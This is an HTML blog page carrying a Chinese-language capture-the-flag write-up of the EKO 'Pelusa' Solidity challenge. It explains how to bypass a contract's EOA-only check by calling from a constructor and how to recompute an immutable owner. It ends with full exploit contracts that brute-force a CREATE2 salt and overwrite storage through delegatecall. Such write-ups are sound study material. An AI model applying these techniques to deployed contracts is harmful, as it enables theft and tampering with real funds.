@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          CTF-EKO-Pelusa - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://thomasxu-blockchain.github.io/EKO-Pelusa/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="../css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="../css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="../css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="../css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="../css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="../css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="../css/widget.css">
+
+
+    
+<link rel="stylesheet" href="../css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="../css/signature.css">
+
+
+    
+<link rel="stylesheet" href="../css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="../css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#EKO" title="EKO">EKO</a>
+                            
+                        </div>
+                        <h1>CTF-EKO-Pelusa</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2023-02-27
+                        </span>
+
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="CTF-EKO-Pelusa"><a href="#CTF-EKO-Pelusa" class="headerlink" title="CTF-EKO-Pelusa"></a>CTF-EKO-Pelusa</h1><hr>
+<pre><code>author：Thomas_Xu
+</code></pre><p>先来看题目描述：</p>
+<blockquote>
+<p>你只要睁开眼睛，就在 1986 年的墨西哥，帮助迭戈将比分从 1 比 2 定为胜利，做任何必要的事情！</p>
+</blockquote>
+<p>好吧，题目没有有价值的提示，只知道我们需要修改一个比分？</p>
+<p>来看合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line">interface IGame &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getBallPossesion</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// "<span class="title">el</span> <span class="title">baile</span> <span class="title">de</span> <span class="title">la</span> <span class="title">gambeta</span>"</span></span><br><span class="line"><span class="function">// <span class="title">https</span>://<span class="title">www</span>.<span class="title">youtube</span>.<span class="title">com</span>/<span class="title">watch</span>?<span class="title">v</span>=<span class="title">qzxn85zX2aE</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/// @<span class="title">title</span> <span class="title">Pelusa</span></span></span><br><span class="line"><span class="function">/// @<span class="title">author</span> <span class="title">https</span>://<span class="title">twitter</span>.<span class="title">com</span>/<span class="title">eugenioclrc</span></span></span><br><span class="line"><span class="function">/// @<span class="title">notice</span> <span class="title">Its</span> 1986, <span class="title">you</span> <span class="title">are</span> <span class="title">in</span> <span class="title">the</span> <span class="title">football</span> <span class="title">world</span> <span class="title">cup</span> (<span class="params">Mexico86</span>), <span class="title">help</span> <span class="title">Diego</span> <span class="title">score</span> <span class="title">a</span> <span class="title">goal</span>.</span></span><br><span class="line"><span class="function">/// @<span class="title">custom</span>:<span class="title">url</span> <span class="title">https</span>://<span class="title">www</span>.<span class="title">ctfprotocol</span>.<span class="title">com</span>/<span class="title">tracks</span>/<span class="title">eko2022</span>/<span class="title">pelusa</span></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Pelusa</span> </span>&#123;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    address internal player;</span><br><span class="line"></span><br><span class="line">    uint256 public goals = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">passTheBall</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.code.length == <span class="number">0</span>, <span class="string">"Only EOA players"</span>);</span><br><span class="line">        <span class="comment">/// @dev "la pelota siempre al 10"</span></span><br><span class="line">        <span class="built_in">require</span>(uint256(uint160(msg.sender)) % <span class="number">100</span> == <span class="number">10</span>, <span class="string">"not allowed"</span>);</span><br><span class="line"></span><br><span class="line">        player = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isGoal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// expect ball in owners posession</span></span><br><span class="line">        <span class="keyword">return</span> IGame(player).getBallPossesion() == owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shoot</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(isGoal(), <span class="string">"missed"</span>);</span><br><span class="line">        <span class="comment">/// @dev use "the hand of god" trick</span></span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(<span class="string">"handOfGod()"</span>));</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"missed"</span>);</span><br><span class="line">        <span class="built_in">require</span>(uint256(bytes32(data)) == <span class="number">22</span>_06_1986);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>合约代码很少，<code>passTheBall</code>函数看起来限制了非EOA账户的调用，然后又对调用者的地址做了一个苛刻的判断。由于不能用合约调用，我们常用的create2跑靓号的解决方案行不通，那这个题看似无解？</p>
+<p>但是…让我们来回想一下，Uniswap限制非EOA账户调用的方式是什么:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function isContract(address addr) internal view returns (bool) &#123;</span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123; size :&#x3D; extcodesize(addr) &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>通常是通过<code>extcodesize</code>这个操作码来返回地址相关代码量的大小，大于0则是合约账户。</p>
+<p>那么题目中的<code>require(msg.sender.code.length == 0, &quot;Only EOA players&quot;);</code>和<code>extcodesize</code>有什么区别呢</p>
+<p><code>address.code</code>是evm在创建合约之后的runtimecode，而合约的构造函数，正是在创建合约时运行的。</p>
+<p>换句话说，在构造函数运行的时候，合约还没有被创建完成，runtimecode还没有被evm生成，<code>address.code</code>的值仍然为0。</p>
+<p><code>passTheBall()</code>将player成功赋值后，才真正进入challange，老规矩先看看Factory吧:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value == <span class="number">0</span>, <span class="string">"dont send ether"</span>);</span><br><span class="line">    address _challenge = address(<span class="keyword">new</span> Pelusa());</span><br><span class="line">    ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// @dev to win this challenge you must drain the contract</span></span><br><span class="line">    Pelusa _target = Pelusa(_challenges[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _target.goals() == <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出来目的是修改goals为2。</p>
+<p>但是在此合约中没有关于goals的赋值语句，那这个题反而变简单了。因为目前想要解题，几乎只有delegatecall这一种方式，很快我们就锁定了<code>shoot</code>函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shoot</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(isGoal(), <span class="string">"missed"</span>);</span><br><span class="line">        <span class="comment">/// @dev use "the hand of god" trick</span></span><br><span class="line">        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(<span class="string">"handOfGod()"</span>));</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"missed"</span>);</span><br><span class="line">        <span class="built_in">require</span>(uint256(bytes32(data)) == <span class="number">22</span>_06_1986);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个判断<code>isGoal</code>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function isGoal() public view returns (bool) &#123;</span><br><span class="line">        &#x2F;&#x2F; expect ball in owners posession</span><br><span class="line">        return IGame(player).getBallPossesion() &#x3D;&#x3D; owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要想通过这个判断，其实就是要获取owner的值，值得一提的是这个变量还没法通过web3.getStorageAt去获取，因为被声明为<code>immutable</code>的变量保存在initcode里面，那这里其实是可以通过查看合约部署时属于哪个区块，照着样子abi编码即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))))</span><br></pre></td></tr></table></figure>
+<p>之后就进入到我们的delegatecall了，这里过于基础，就不讲了，相关内容可以移步<a href="https://thomasxu-blockchain.github.io/delegatecall/">https://thomasxu-blockchain.github.io/delegatecall/</a></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengePelusa.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract PelusaDeployer &#123;</span><br><span class="line">    ChallengePelusaAttacker public attacker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address target) &#123;</span><br><span class="line">        bytes32 salt = calculateSalt(target);</span><br><span class="line">        attacker = <span class="keyword">new</span> ChallengePelusaAttacker&#123; <span class="attr">salt</span>: bytes32(salt) &#125;(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">calculateSalt</span>(<span class="params">address target</span>) <span class="title">private</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes32</span>) </span>&#123;</span><br><span class="line">        uint256 salt = <span class="number">0</span>;</span><br><span class="line">        bytes32 initHash = keccak256(abi.encodePacked(type(ChallengePelusaAttacker).creationCode, abi.encode(target)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            bytes32 hash = keccak256(abi.encodePacked(bytes1(<span class="number">0xff</span>), address(<span class="keyword">this</span>), bytes32(salt), initHash));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (uint160(uint256(hash)) % <span class="number">100</span> == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            salt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes32(salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ChallengePelusaAttacker is IGame &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    uint256 public goals;</span><br><span class="line"></span><br><span class="line">    Pelusa private pelusa;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _target) &#123;</span><br><span class="line">        pelusa = Pelusa(_target);</span><br><span class="line">        pelusa.passTheBall();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params">address _deployer</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里把0换成Pelusa合约部署时的区块号即可</span></span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(_deployer, bytes32(uint256(<span class="number">0</span>)))))));</span><br><span class="line">        pelusa.shoot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getBallPossesion</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handOfGod</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        goals = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22</span>_06_1986;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/EKO-SmartHorrocrux/" data-toggle="tooltip" data-placement="top" title="CTF-EKO-SmartHorrocrux">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/EKO-MetaverseSupermarket/" data-toggle="tooltip" data-placement="top" title="CTF-EKO-MetaverseSupermarket">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="../css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="../js/music-player/utill.js"></script>
+
+
+<script src="../js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="../js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF-EKO-Pelusa"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">CTF-EKO-Pelusa</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exploit"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">Exploit</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#EKO" title="EKO">EKO</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2023 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="../js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="../js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="../js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="../js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://thomasxu-blockchain.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
